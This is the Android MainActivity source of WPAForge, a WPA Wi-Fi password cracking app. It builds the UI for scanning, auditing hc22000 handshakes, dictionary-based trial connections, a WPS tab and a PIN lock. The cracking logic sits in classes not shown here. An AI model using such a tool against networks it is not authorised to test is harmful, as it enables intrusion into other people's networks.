package io.github.wlmosv_png.wpaforge;

import android.Manifest;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.Typeface;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.text.TextUtils;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.EditText;
import android.widget.HorizontalScrollView;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.Toast;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import io.github.wlmosv_png.wpaforge.audit.AuditEngine;
import io.github.wlmosv_png.wpaforge.ui.DictIcons;
import io.github.wlmosv_png.wpaforge.audit.Candidate;
import io.github.wlmosv_png.wpaforge.audit.DictGenerator;
import io.github.wlmosv_png.wpaforge.audit.RootProber;
import io.github.wlmosv_png.wpaforge.audit.HistStore;
import io.github.wlmosv_png.wpaforge.audit.SavedWifiReader;
import io.github.wlmosv_png.wpaforge.audit.SmartSorter;
import io.github.wlmosv_png.wpaforge.audit.TaskQueue;
import io.github.wlmosv_png.wpaforge.audit.TargetDictBuilder;
import io.github.wlmosv_png.wpaforge.core.NetRecord;
import io.github.wlmosv_png.wpaforge.scan.ChannelAnalyzer;
import io.github.wlmosv_png.wpaforge.scan.ScanDetail;
import io.github.wlmosv_png.wpaforge.scan.Scanner;
import io.github.wlmosv_png.wpaforge.scan.SsidGroup;
import io.github.wlmosv_png.wpaforge.ui.ChannelBars;
import io.github.wlmosv_png.wpaforge.ui.RadarSweep;
import io.github.wlmosv_png.wpaforge.ui.AmberTheme;
import io.github.wlmosv_png.wpaforge.ui.AuthorCard;
import io.github.wlmosv_png.wpaforge.ui.NetDialog;
import io.github.wlmosv_png.wpaforge.ui.StagedProgress;

/**
 * 主界面。四个页签：观测 / 审计 / 试连 / 设置。
 * 全部代码构建，不带 XML 布局资源，视觉上与原版形态完全分离。
 */
public class MainActivity extends Activity {

    // 配色：琥珀主色 + 近黑背景，与常见的蓝紫渐变彻底分开。
    //
    // Obsidian Amber 重构：数值统一收敛到 ui/AmberTheme，这里只保留**字段名**，
    // 于是其它页面的引用一处都不用改，而三档表面（页面 / 卡片 / 凹陷）
    // 从此只有一个出处。语义色（成功 / 错误）保持原色相，只是统一了同色系暗底。
    private static final int BG        = AmberTheme.BG;
    private static final int SURFACE   = AmberTheme.CARD;
    private static final int ACCENT    = AmberTheme.ACCENT;
    private static final int TEXT      = AmberTheme.TEXT;
    private static final int TEXT_DIM  = AmberTheme.TEXT_DIM;
    private static final int DANGER    = AmberTheme.DANGER;
    private static final int OK_GREEN  = AmberTheme.OK;

    /* ---------- 按钮色板（只有这四档，别再加第五种） ---------- */
    /** 次操作底：暗面，比 SURFACE 亮一点点，够区分但不抢眼 */
    private static final int BTN_2ND_BG   = AmberTheme.BTN_2ND_BG;
    /** 次操作描边：极淡的白，靠它把暗底从背景里托起来 */
    private static final int BTN_2ND_EDGE = AmberTheme.BTN_2ND_EDGE;
    /** 主操作文字色（琥珀底上必须用深色，白字对比度不够） */
    private static final int ON_ACCENT    = AmberTheme.ON_ACCENT;
    /** 凹陷面（日志区等）：比页面还暗，形成「凹进去」的层次 */
    private static final int SUNKEN       = AmberTheme.SUNKEN;
    /** 卡片描边 */
    private static final int CARD_EDGE    = AmberTheme.EDGE;

    private LinearLayout root;
    private LinearLayout content;          // 外层（竖直排列 4 个 page）
    private LinearLayout pageObserve;      // 观测页容器（建一次）
    private LinearLayout pageAudit;
    private LinearLayout pageConnect;
    private LinearLayout pageSettings;
    private boolean[] pageBuilt = new boolean[5];   // 是否已构建过
    private TextView tabObserve, tabAudit, tabConnect, tabWps, tabSettings;

    private Scanner scanner;
    private final Handler ui = new Handler(Looper.getMainLooper());

    // 观测页组件
    private RadarSweep radar;
    /** 信号分布板：五档统计 + 最强若干台的横向条（不再用单调柱状图）。 */
    private LinearLayout signalBoard;
    /** 雷达卡下面的「关键数字」行（每次扫描后重填） */
    private LinearLayout radarStatsBox;
    /**
     * 雷达卡头部：**一行纯状态文字** —— 只说「什么时候扫的」。
     *
     * <p>演进过程（用户三次明确意见，别再往回改）：
     * ① 带底框的按钮 →「不好那个按钮了，文字可以保留」；
     * ② 整行可点 + 「轻点刷新」+ 倒计时 →「不用点击更新了，就显示啥时候扫描的就行了」。
     * 所以现在是**不可点**的纯信息行：扫描由后台轮询自己维持，
     * 用户不需要（也不应该）去操心系统那 30 秒的频率限制。
     */
    private TextView radarStatus;
    /** 上次扫描的 BSSID 集合，用来算「新增 / 消失」 */
    private java.util.List<String> lastBssids;
    private io.github.wlmosv_png.wpaforge.scan.ScanDiff.Result lastDiff;
    /** 1 秒一跳的文案刷新（只有观测页在前台时才跑） */
    private final Runnable statusTick = new Runnable() {
        @Override public void run() {
            if (currentTab == 0) updateRadarStatus();
            ui.postDelayed(this, 1000);
        }
    };
    private ChannelBars channelBars;
    private LinearLayout netList;
    /** 观测页的已存 WiFi 卡片；缓存上次结果，不重复读 root */
    private TextView savedWifiCard;
    private int savedWifiTotal = -1;
    private int savedWifiWeak = -1;
    private TextView observeNotice;
    /** 扫描器最近一次报上来的原因（只作参考，显示与否由真实状态决定）。 */
    private String lastScanNotice = null;
    private boolean lastScanNoticeIsError = false;
    /**
     * 破解页自己的提示条（WiFi 未开等）。
     *
     * <h3>为什么要与 observeNotice 分开</h3>
     * 原来两页**共用同一个字段**：观测页构造一次、破解页又构造一次并覆盖字段，
     * 各自 addView 到自己的页面。后果有两条（2026-11-02 用户截图）：
     * <ul>
     *   <li>字段最终指向破解页那个 → 观测页的提示条**永远不显示**
     *       （扫描不到网时用户看不到任何原因）；</li>
     *   <li>Scanner 写的「WiFi 未开启」被投到**破解页**上，而且用户后来
     *       打开 WiFi 也**不会消失** —— 变成一条残留的假状态。</li>
     * </ul>
     * 现在拆成两个独立控件，各管各的。
     */
    /** 信道建议卡（观测页，信道占用图下方） */
    private TextView adviceCard;
    private List<NetRecord> lastRecords = new ArrayList<>();

    // 审计页组件
    private TextView dictStatus;
    /** 设置页的模式说明卡片（切模式后要刷新） */
    private TextView modeInfo;
    /** 设置页里的“当前模式能不能用”小字 */
    private TextView modeReadyLabel;
    /** 离线校验是否在跑（同一时间只允许一条） */
    private boolean offlineBusy = false;
    private List<Candidate> currentDict;

    // ================= 审计工作台（1.9.44） =================
    /** 五步工作流状态机：谁该做、能不能开始、用哪本字典，全在它里面。 */
    private final io.github.wlmosv_png.wpaforge.audit.AuditWorkflow workbench =
            new io.github.wlmosv_png.wpaforge.audit.AuditWorkflow();
    /** 已导入的材料条目（按文件顺序）。 */
    private java.util.List<io.github.wlmosv_png.wpaforge.audit.Hc22000.Entry> offEntries;
    /** 哪些材料条目被展开看详情。 */
    private final java.util.Set<Integer> diagOpen = new java.util.HashSet<Integer>();
    /** 顶部状态条 / 现状 / ①材料摘要 / ①材料列表 / ②字典 / ③执行 的容器。 */
    private LinearLayout auditFlowStrip, auditOverviewBox, auditMatBox, auditDiagBox,
            auditDictBox, auditRunBox, auditChanStrip, auditRecBox, strengthRecBox;
    /** 四步状态条的跳转锚点卡片。 */
    private final View[] auditStepCards = new View[4];
    /** 材料主按钮（导入 / 更换）、清除材料、开始、停止、按材料 SSID 派生。 */
    private Button auditImportBtn, auditClearMatBtn, auditStartBtn, auditStopBtn, auditDeriveMat;
    /** 字典卡：空字典时的直达入口 / 「更换字典」（没字典时隐藏）。 */
    private LinearLayout auditDictEmptyCta;
    private Button auditChangeDictBtn;
    private TextView auditBlocker;
    /** 运行中的进度条（条数 / 百分比 / 已用 / 速率）。 */
    private io.github.wlmosv_png.wpaforge.ui.ThinProgress auditProgress;
    /**
     * 当前字典的**代际**：每次成功替换字典就 +1。
     *
     * <p>用来作废"更早发出的异步请求"（派生 / 加载 / 从快照恢复都是后台线程 +
     * ui.post）。没有它，最终生效的字典取决于线程完成顺序，而不是用户最后一次操作。
     */
    private long dictEpoch = 0;
    /** 上次的结果记录在盘上但解不开（要和"没跑过"分开说）。 */
    private boolean verdictLoadFailed = false;
    /** 运行中痕迹提示块（③ 卡内）。 */
    private LinearLayout auditInflightBox;
    /** 取值：材料名（开跑那一刻固定），结果卡只认它，不再读任何可变字段。 */
    private String frozenMaterialName = "";
    /** 离线引擎最后上报的已处理条数（看门狗强制解锁时写结果用）。 */
    private long offlineLastTested = 0L;
    /** 当前查看的运行记录频道。 */
    private io.github.wlmosv_png.wpaforge.audit.RunLog.Op logChannel =
            io.github.wlmosv_png.wpaforge.audit.RunLog.Op.OFFLINE;
    /** 上次字典恢复失败的说明（空 = 没问题）。 */
    private String dictRestoreNote = "";
    /** 「按材料 SSID 派生」当前指向的 SSID。 */
    private String auditMaterialSsid = "";
    /**
     * 步骤 ② 最多画多少张材料卡。
     *
     * <p>22000 上限 4 MB，一行不到 100 字节 —— 一份完整抓包文件里完全可能有
     * 上万条握手。逐条建 View 会直接卡死界面（实测：这是最容易忽略的一处
     * 「数据量决定渲染量」）。所以只画前 {@value} 张，其余给一个入口。
     */
    private static final int MAX_DIAG_CARDS = 40;
    /** 选条目对话框最多列多少条（同样是为了不把界面拖死）。 */
    private static final int MAX_PICK_ITEMS = 200;

    // ================= 离线校验 / 运行记录（1.9.43） =================
    /** 结构化运行记录：离线与口令强度两个频道互不干扰。 */
    private final io.github.wlmosv_png.wpaforge.audit.RunLog runLog =
            new io.github.wlmosv_png.wpaforge.audit.RunLog();
    /** 最近一次离线校验结果（页面切换 / 应用重开后仍在）。 */
    private io.github.wlmosv_png.wpaforge.audit.OfflineVerdict lastVerdict =
            io.github.wlmosv_png.wpaforge.audit.OfflineVerdict.none();
    /** 正在跑的引擎；null = 没在跑。停止按钮靠它。 */
    private io.github.wlmosv_png.wpaforge.audit.AuditEngine runningEngine;
    /** 结果卡容器。 */
    private LinearLayout offResult;
    /** 当前选中材料的诊断报告（详情弹窗用）。 */
    private io.github.wlmosv_png.wpaforge.audit.MaterialDoctor.Report lastReport;
    /** 当前选中材料（「按此目标派生」用）。 */
    private io.github.wlmosv_png.wpaforge.audit.Hc22000.Entry lastEntry;
    /** 离线日志滚动容器（判断是否该自动滚底）。 */
    private ScrollView auditLogScroll;
    /** 口令强度评估自己的记录区（与离线校验彻底分开）。 */
    private ScrollView strengthLogScroll;
    /** 「导入材料」按钮（busy 时弱化，不再兼任停止按钮）。 */
    private Button offPick;
    private String currentDictName = "";
    /**
     * 当前字典的**来源代码**（不是显示文案，避免中英切换后比较失效）。
     * 用途只有一个：字典来源弹窗里把"现在用的是哪个"标出来，
     * 以及破解页那行显示成「当前字典: 画像派生 · 53 条」。
     */
    private String currentDictSource = "";
    private static final String SRC_PROFILE = "profile";
    private static final String SRC_GENERIC = "generic";
    private static final String SRC_FILE = "file";
    /** 通用生成器的条数是确定的，算一次就缓存 */
    private int genericDictCount = 0;
    /**
     * 当前字典里**本目标已经跑过**的条数（-1 = 还没算）。
     * 它必须显示在界面上，不能只写日志 —— 用户不看日志的话，
     * 看到"3000 条的字典只跑了 1200 条"只会以为程序坏了。
     */
    private int currentDictSkipped = -1;
    private AuditEngine engine;

    /**
     * 破解页的执行模式（第一批补齐：单本 vs 多字典计划）。
     *
     * <p>{@code usePlanMode == false} 是既有单字典模式：从字典来源里挑一本，
     * 跑完即停。{@code usePlanMode == true} 是多字典计划模式：不逐本选字典，
     * 而是直接用字典管理页建好的计划，启动后按顺序自动接力。
     *
     * <p>这是**纯界面状态**，不进判定链、不改任何账本/游标语义。真正执行时，
     * 服务端仍由既有的 {@code CrackService.loadPlanForRun} 按计划文件接管 ——
     * 这里只负责「让用户能明确选到计划、并把目标对齐到计划」。
     */
    private boolean usePlanMode = false;
    /** 当前选中的计划快照（仅用于界面显示与启动对齐，不参与判定）。 */
    private io.github.wlmosv_png.wpaforge.audit.DictPlan selectedPlan = null;
    /** 结算卡当前对应哪条任务（多字典接力切换时用它判断卡是否已过期）。 */
    private String resultCardTaskId = "";
    /** 字典续命：本次要继承的起始 offset（0 = 从头跑）。 */
    private int pendingResumeOffset = 0;
    /** 本次字典的内容 SHA-256（入队时写进任务，供下次续命识别）。 */
    private String pendingDictSha = "";

    // 试连页组件
/** 明文备份清理行（只在备份存在时创建）。 */
    private Button plainBakBtn;
    private Button languageBtn;
    private ScrollView mainScroll;
    private TextView connectModeView;
    private TextView connectEmptyHint;
    private TextView connectDictView;
    private TextView smartToggle;
    private TextView targetDictToggle;
    private boolean smartSortEnabled = false;
    private boolean targetDictEnabled = false;
    private Button startBtn;
    private Button pauseBtn;
    private Button stopBtn;
    private io.github.wlmosv_png.wpaforge.ui.StagedProgress connectProgress;

    /* ─────────── Obsidian Amber 重构新增的展示位 ───────────
     * 全部只是「往哪里写」，数据一律来自原有的业务回调与字段：
     *   · 目标 / 字典 / 通道  → 原有的 updateTargetLabel / updateConnectDict / updateConnectMode
     *   · 已完成 / 总数 / 完成度 / 速率 / 剩余
     *                        → onProgress(tested, total, rate, etaMs) 里**原样**传进来的值
     *   · 当前状态           → 队列里任务的真实 state + 服务是否在跑
     * 这里不计算任何业务数字，也不新增状态位。
     */
    private TextView netMetaView;        /** 网络卡第二层：信号 · 信道 · 频段 */
    private TextView netSecChip;         /** 安全类型胶囊 */
    private TextView statDoneView;       /** 已完成 */
    /** 已证实错误（候选级 AUTH_FAIL/DIRECT）—— 与「未确定」严格分开。 */
    private TextView statWrongView;
    /** 未确定（无结论 + 网络级失败 + 推断失败）—— 绝不显示成「密码错误」。 */
    private TextView statUnkView;
    /** 计划与「本次跳过」一行（无计划、无跳过时隐藏；不占用统计语义）。 */
    private TextView planLineView;
    private TextView statTotalView;      /** 总数 */
    private TextView statPctView;        /** 完成度（大数字） */
    /**
     * 统计行 / 速率行。
     *
     * <p>提升为成员是为了**空闲时整行收起**（2026-11-02 用户截图）：
     * 没跑过任何东西时，四列「—」和「速率 待测 / 剩余 待估」全是占位噪声，
     * 卡片被撑得很高、中间大片留白，看着不精致。
     */
    private LinearLayout statRowView;
    private LinearLayout footRowView;
    private TextView statRateView;       /** 速率（条/分，来自同一次回调） */
    private TextView statEtaView;        /** 剩余时间（来自同一次回调） */
    private TextView stateBig;           /** 当前状态（大字） */
    private TextView actionsHint;        /** 底部可用性说明 */
    private LinearLayout progressCard;   /** 任务进度卡 */
    private LinearLayout eventCard;      /** 状态与事件卡 */
    private LinearLayout actionsCard;    /** 底部操作卡 */
    /** 最近一次任务结论（只由 onTaskDone 写入，仅用于显示，不参与任何判定）。 */
    private String lastOutcomeLabel = "";
    private int lastOutcomeColor = TEXT_DIM;
    private TextView connectTargetView;

    // ── 方案 A（驾驶舱）新增：候选窗口 / 命中卡片 / 日志分级 ──
    /** 最近几条候选（正在试 + 上两条） */
    private final io.github.wlmosv_png.wpaforge.ui.CandidateTicker candTicker =
            new io.github.wlmosv_png.wpaforge.ui.CandidateTicker(3);
    private TextView candLabel;
    /** 当前候选（带「顶上来 / 消散」动效）。 */
    private io.github.wlmosv_png.wpaforge.ui.CandidateRoll candRoll;
    private TextView candPrev;
    private LinearLayout candBox;
    /** 命中卡片：产品的巅峰时刻，值得单独一块 */
    private LinearLayout hitCard;

    /* ── 结算卡：跑完之后给出的"结论"，不是一个空状态 ──────────────
     * 破解的常态结果是"没中"。工具的**常态状态**没做好，用户就会觉得是坏的。
     * 所以跑完不再只把状态改成"已结束"，而是换一张有结论、有解释、有下一步的卡。 */
    private LinearLayout resultCard;
    private TextView resultTitle, resultSub, resultWhy;
    private LinearLayout resultActions;
    /** 收尾中：候选跑完了但服务还在恢复临时网络配置 —— 别让界面停在"运行中 100%" */
    private boolean finishingNow = false;
    private TextView finishNote;
    private long finishingStartedAt = 0L;
    /** 服务在收尾结束时给的结论（例：已恢复 : OK），显示在结算卡上 */
    private String lastRestoreSummary = "";

    /* ── 恢复状态区（1.9.28）─────────────────────────────────────────
     * 为什么必须有：以前恢复记录完全不可见 —— 用户唯一的动作是“再点一次开始”，
     * 而闸门会一直把他挡在外面（真实故障：一条 VERIFY 失败的记录锁了整整一下午）。
     */
    private LinearLayout restoreCard;
    private TextView restoreSummary;
    private LinearLayout restoreList;

    /**
     * 收尾计时。
     *
     * <p>为什么必须做：收尾里有一段 `ConfigRestorer.waitConnected(ssid, 15000)`
     * —— 要把用户原来的网络写回去、并**轮询最多 15 秒**等它连上。
     * 旧版这段时间界面只有一句"收尾中"，用户不知道在等什么、还要等多久，
     * 进度条还在放流动效 → 看起来就是卡死。
     */
    private final Runnable finishingTick = new Runnable() {
        @Override
        public void run() {
            if (!finishingNow) {
                if (finishNote != null) finishNote.setVisibility(View.GONE);
                return;
            }
            long sec = Math.max(0, (System.currentTimeMillis() - finishingStartedAt) / 1000);
            if (finishNote != null) {
                finishNote.setVisibility(View.VISIBLE);
                finishNote.setText(sec <= 16L
                        ? L.s("破解已经跑完 ✓ 现在把你原来连的那个网写回去，最长等 15 秒"
                                      + "（已等 " + sec + " 秒）",
                              "Cracking is done \u2713 currently restoring the network you were "
                                      + "on before (up to 15s, " + sec + "s elapsed)")
                        : L.s("还在写回原来的网络 · 已等 " + sec + " 秒（超过预期的 15 秒，"
                                      + "细节见攻击流）",
                              "Still restoring the previous network \u00b7 " + sec
                                      + "s (past the 15s estimate, see the stream)"));
            }
            ui.postDelayed(this, 500L);
        }
    };
    private TextView hitPw;
    private TextView hitMeta;
    /** 日志全量（含被筛掉的）；streamBuffer 只是它的「可见视图」 */
    private final java.util.List<LogLine> streamLines = new java.util.ArrayList<>();
    /**
     * 上一次输出过「说明行」的结论键（P1b）。
     *
     * <p>逐条候选的说明（例如「本次没连上目标，但没有证据证明这条密码错了」）
     * 在同一类结论连续出现时毫无新意，只重复刷屏。同一键只说明一次，
     * 直到结论类型变化。
     */
    private String lastWhyKey = null;
    /** 最近一次实时分布（来自 onTally，只用于显示）。 */
    private int lastTallyConfirmed = 0;
    private int lastTallyInconclusive = 0;
    private int lastTallyNetAuthFail = 0;
    /** true = 只看关键（里程碑 + 失败原因），默认开 */
    /**
     * 日志级别：true = 只看关键，false = 全部。
     *
     * <p>默认改成「全部」—— 关键级别会把逐条候选的结果藏起来，
     * 用户看到的是"跑了半天什么都没发生"。全部视图里每条候选一行，
     * 至少能看出"程序在动、这条不对"。
     */
    private boolean streamKeyOnly = false;
    private TextView chipKey;
    private TextView chipAll;
    private int lastTested = 0, lastTotal = 0;
    /** 当前候选在字典里的位置（1 起）—— 脱敏后靠它把日志对回字典 */
    private int curCandIndex = 0;
    private TextView connectStatsView;
    private TextView connectStreamView;
    /** 候选流折叠：头部、箭头、行数、布局参数 */
    private LinearLayout flowHeader;
    private TextView flowChevron;
    private TextView flowLabel;
    private TextView flowCount;
    private TextView flowClear;
    /** 日志区的滚动容器：可滚动 + 自动跟随 */
    private android.widget.ScrollView streamScroll;
    /** 日志区的外层容器（FrameLayout）。高度控制在这里 ——
     *  streamScroll 在里面是 MATCH_PARENT，不直接设 params。
     *  直接给 streamScroll 设 LinearLayout 的 params 会在 FrameLayout
     *  测量时抛 ClassCastException。 */
    private android.widget.FrameLayout streamWrapView;
    /** 是否自动跟随到底部（用户上滑后关闭） */
    private boolean streamAutoScroll = true;
    /** 日志区的「回到最新」浮标：用户上滑看历史时出现 */
    private TextView jumpLatestBtn;
    private LinearLayout.LayoutParams streamParams;
    /**
     * 日志区是否折叠。**默认折叠**（UI 第二轮）。
     *
     * <p>用户反馈：日志区占的空间太多，核心状态反而不突出。默认只留
     * 四五行最新事件，想看历史点标题展开 —— 原始证据一条都没删
     * （{@code streamLines} 全量保留、文件日志逐条落盘）。
     */
    private boolean streamCollapsed = true;
    /** 折叠态日志窗高度（dp）。约 4~5 行，且**可内部滚动**。 */
    private static final int STREAM_COLLAPSED_DP = 132;
    /** 展开态日志窗高度（dp）。 */
    private static final int STREAM_EXPANDED_DP = 320;
    private RootProber rootProber;
    private volatile boolean rootProberRunning = false;
    private NetRecord targetNet;
    /** 设置页两个连接开关（状态直接写在按钮文案上） */
    private Button connPinBtn, connRotBtn;
    /** 设置页「保活状态」卡片 */
    private TextView keepAliveLabel;
    private Thread connectThread;

    // 服务绑定
    private CrackService crackService;
    private boolean serviceBound = false;
    private final java.util.List<TaskQueue.Task> queueCache = new java.util.ArrayList<>();
    /** 当前用作字典的文件路径（空表示用内置生成器） */
    private String currentDictPath = "";
    /**
     * 字典条数的**显示值**。
     *
     * <p>为什么单独存一个：回前台时界面可能只从任务里拿得到「名字 + 条数」
     * （候选列表要读盘、可能几 MB），没必要为了显示一个数字先卡住界面。
     * 列表补齐后会覆盖它。
     */
    private int dictSizeShown = 0;
    /** 是否正在后台补齐候选列表（防止重复触发读盘）。 */
    private boolean dictReloading = false;
    private LinearLayout queueBox;
    /** 设置页里的权限状态行（授权后要刷新） */
    private TextView permLabel;
    /** 「去系统设置里允许」按钮；权限齐全时隐藏 */
    private Button permFixBtn;


    private int currentTab = 0;
    private float dp;
    /** 列表里的小字档（BSSID / 等级 / 胶囊）：比正文再小一档。 */
    private static final float FS_TINY = 10f;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        L.init(this);
        dp = getResources().getDisplayMetrics().density;
        buildUi();
        // 旧版单一计划文件 → 按目标分文件（一次性，幂等，不删旧文件）。
        // 放在这里是为了：只开破解页（没进字典管理）时也能看到迁移后的计划。
        try { io.github.wlmosv_png.wpaforge.audit.DictPlan.migrateLegacy(this); }
        catch (Throwable ignored) {}
        requestPermsIfNeeded();
        scanner = new Scanner(this, scanListener);
        bindCrackService();
        requestNotifPermission();
        if (Prefs.pinEnabled(this)) setupPinGate();
    }

    /** PIN 锁遮挡层：设了 PIN 就先解锁才能用 */
    private android.widget.FrameLayout pinGate = null;

    private void setupPinGate() {
        android.widget.FrameLayout root = (android.widget.FrameLayout)
                ((android.view.ViewGroup) getWindow().getDecorView()
                        .findViewById(android.R.id.content));
        if (root == null) return;
        pinGate = new android.widget.FrameLayout(this);
        pinGate.setBackgroundColor(AmberTheme.SCRIM);
        pinGate.setClickable(true);
        pinGate.setFocusable(true);

        android.widget.LinearLayout box = new android.widget.LinearLayout(this);
        box.setOrientation(android.widget.LinearLayout.VERTICAL);
        android.widget.FrameLayout.LayoutParams bp = new android.widget.FrameLayout.LayoutParams(
                android.view.ViewGroup.LayoutParams.MATCH_PARENT,
                android.view.ViewGroup.LayoutParams.WRAP_CONTENT);
        bp.setMargins(px(48), 0, px(48), 0);
        bp.gravity = android.view.Gravity.CENTER;
        box.setPadding(0, 0, 0, 0);

        android.widget.TextView t = new android.widget.TextView(this);
        t.setText(L.s("WPAForge 已锁定\n输入 PIN 解锁",
                "WPAForge locked\nEnter PIN to unlock"));
        t.setTextSize(AmberTheme.FS_TITLE);
        t.setTextColor(0xFFFFFFFF);
        t.setGravity(android.view.Gravity.CENTER);
        t.setPadding(0, 0, 0, px(20));
        box.addView(t);

        final android.widget.EditText pin = new android.widget.EditText(this);
        pin.setHint(L.s("PIN", "PIN"));
        pin.setInputType(android.text.InputType.TYPE_CLASS_NUMBER
                | android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD);
        pin.setTextSize(AmberTheme.FS_STAT);
        pin.setGravity(android.view.Gravity.CENTER);
        box.addView(pin);

        android.widget.Button ok = new android.widget.Button(this);
        ok.setText(L.s("解锁", "Unlock"));
        ok.setOnClickListener(v -> {
            if (Prefs.checkPin(this, pin.getText().toString())) {
                root.removeView(pinGate);
                pinGate = null;
            } else {
                pin.setText("");
                pin.setHint(L.s("PIN 错误", "Wrong PIN"));
                android.widget.Toast.makeText(this,
                        L.s("PIN 错误", "Wrong PIN"), android.widget.Toast.LENGTH_SHORT).show();
            }
        });
        box.addView(ok, new android.widget.LinearLayout.LayoutParams(
                android.view.ViewGroup.LayoutParams.MATCH_PARENT,
                android.view.ViewGroup.LayoutParams.WRAP_CONTENT));

        pinGate.addView(box, bp);
        root.addView(pinGate, new android.widget.FrameLayout.LayoutParams(
                android.view.ViewGroup.LayoutParams.MATCH_PARENT,
                android.view.ViewGroup.LayoutParams.MATCH_PARENT));
    }

    /** PIN 设置对话框（设置页调用）：新 PIN 两遍确认 */
    private void showPinSetup() {
        if (Prefs.pinEnabled(this)) {
            // 已设置 → 先验证旧 PIN
            final android.widget.EditText old = new android.widget.EditText(this);
            old.setHint(L.s("当前 PIN", "Current PIN"));
            old.setInputType(android.text.InputType.TYPE_CLASS_NUMBER
                    | android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD);
            new android.app.AlertDialog.Builder(this)
                    .setTitle(L.s("修改 PIN", "Change PIN"))
                    .setView(old)
                    .setPositiveButton(L.s("下一步", "Next"), (d, w) -> {
                        if (Prefs.checkPin(this, old.getText().toString())) {
                            askNewPin();
                        } else {
                            Toast.makeText(this, L.s("当前 PIN 错误", "Wrong current PIN"),
                                    Toast.LENGTH_SHORT).show();
                        }
                    })
                    .setNegativeButton(L.s("取消", "Cancel"), null)
                    .show();
            return;
        }
        askNewPin();
    }

    private void askNewPin() {
        final android.widget.EditText p1 = new android.widget.EditText(this);
        p1.setHint(L.s("新 PIN（数字）", "New PIN (digits)"));
        p1.setInputType(android.text.InputType.TYPE_CLASS_NUMBER
                | android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD);
        new android.app.AlertDialog.Builder(this)
                .setTitle(L.s("设置 PIN", "Set PIN"))
                .setView(p1)
                .setPositiveButton(L.s("确定", "OK"), (d, w) -> {
                    String v = p1.getText().toString().trim();
                    if (v.length() < 4) {
                        Toast.makeText(this, L.s("PIN 至少 4 位", "PIN needs at least 4 digits"),
                                Toast.LENGTH_SHORT).show();
                        return;
                    }
                    Prefs.setPin(this, v);
                    Toast.makeText(this, L.s("PIN 已设置", "PIN set"),
                            Toast.LENGTH_SHORT).show();
                })
                .setNegativeButton(L.s("取消", "Cancel"), null)
                .show();
    }

    private void confirmClearPin() {
        final android.widget.EditText p = new android.widget.EditText(this);
        p.setHint(L.s("当前 PIN", "Current PIN"));
        p.setInputType(android.text.InputType.TYPE_CLASS_NUMBER
                | android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD);
        new android.app.AlertDialog.Builder(this)
                .setTitle(L.s("清除 PIN", "Remove PIN"))
                .setView(p)
                .setPositiveButton(L.s("清除", "Remove"), (d, w) -> {
                    if (Prefs.checkPin(this, p.getText().toString())) {
                        Prefs.clearPin(this);
                        Toast.makeText(this, L.s("PIN 已清除", "PIN removed"),
                                Toast.LENGTH_SHORT).show();
                    } else {
                        Toast.makeText(this, L.s("PIN 错误", "Wrong PIN"),
                                Toast.LENGTH_SHORT).show();
                    }
                })
                .setNegativeButton(L.s("取消", "Cancel"), null)
                .show();
    }

    private void requestNotifPermission() {
        if (android.os.Build.VERSION.SDK_INT >= 33) {
            if (checkSelfPermission("android.permission.POST_NOTIFICATIONS")
                    != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{"android.permission.POST_NOTIFICATIONS"}, 1002);
            }
        }
    }

    private final android.content.ServiceConnection svcConn =
            new android.content.ServiceConnection() {
        @Override
        public void onServiceConnected(android.content.ComponentName name, android.os.IBinder binder) {
            CrackService.LocalBinder lb = (CrackService.LocalBinder) binder;
            crackService = lb.service();
            serviceBound = true;
            crackService.addCallback(svcCallback);
            setRunning(crackService.isWorking());
            refreshQueue();
            // 服务刚绑上：目标/字典可能只存在于服务里（界面被系统重建过）
            restoreSelectionFromAuthority();
        }

        @Override
        public void onServiceDisconnected(android.content.ComponentName name) {
            serviceBound = false;
            crackService = null;
        }
    };

    private void bindCrackService() {
        android.content.Intent i = new android.content.Intent(this, CrackService.class);
        bindService(i, svcConn, BIND_AUTO_CREATE);
    }

    private float dp(float v) { return v * dp; }

    private int px(float v) { return Math.round(v * dp); }

    // ---------------- UI 构建 ----------------

    private void buildUi() {
        root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(BG);

        // 顶部标题条
        LinearLayout header = new LinearLayout(this);
        header.setOrientation(LinearLayout.VERTICAL);
        // 方案 A：这一条压扁一点，把纵向空间让给破解页的主区
        header.setPadding(px(22), px(34), px(22), px(2));
        TextView title = new TextView(this);
        title.setText("WPAForge");
        title.setTextSize(AmberTheme.FS_DISPLAY);
        title.setTextColor(TEXT);
        title.setTypeface(Typeface.create("sans-serif-light", Typeface.NORMAL));
        title.setLetterSpacing(0.04f);
        header.addView(title);
        TextView sub = new TextView(this);
        sub.setText(L.s("WPA 密码破解工具 · 仅限自有网络", "WPA password cracker · authorised networks only"));
        sub.setTextSize(AmberTheme.FS_LABEL);
        sub.setTextColor(TEXT_DIM);
        header.addView(sub);
        root.addView(header);

        // 页签
        LinearLayout tabs = new LinearLayout(this);
        tabs.setOrientation(LinearLayout.HORIZONTAL);
        tabs.setPadding(px(10), px(2), px(10), px(6));
        tabObserve = makeTab(L.s("观测", "Observe"), 0);
        tabAudit = makeTab(L.s("审计", "Audit"), 1);
        tabConnect = makeTab(L.s("破解", "Crack"), 2);
        tabWps = makeTab(L.s("WPS", "WPS"), 3);
        tabSettings = makeTab(L.s("设置", "Settings"), 4);
        tabs.addView(tabObserve, gapWeight(10));
        tabs.addView(tabAudit, gapWeight(10));
        tabs.addView(tabConnect, gapWeight(10));
        tabs.addView(tabWps, gapWeight(10));
        tabs.addView(tabSettings, gapWeight(0));
        root.addView(tabs);

        // 内容容器（可滚动）
        mainScroll = new ScrollView(this);
        ScrollView sv = mainScroll;
        sv.setFillViewport(true);
        content = new LinearLayout(this);
        content.setOrientation(LinearLayout.VERTICAL);
        // 底部留白：Android 15 上 targetSdk 35 强制 edge-to-edge，手势区占底部 96px
